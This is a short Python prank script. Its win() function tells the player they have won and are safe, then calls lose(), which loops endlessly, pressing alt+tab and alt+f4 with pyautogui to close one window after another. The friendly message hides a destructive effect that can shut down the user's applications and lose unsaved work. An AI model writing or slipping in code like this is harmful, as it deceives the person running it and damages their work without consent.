import pyautogui
import time

def win():
    print("You won. You're safe.")
    time.sleep(1)
    print("Or so you think. SIKE!")
    time.sleep(1)
    print("Bye!")
    time.sleep(1)
    lose()
def lose():
    while True:
        pyautogui.hotkey('alt', 'tab')
        pyautogui.hotkey('alt', 'f4')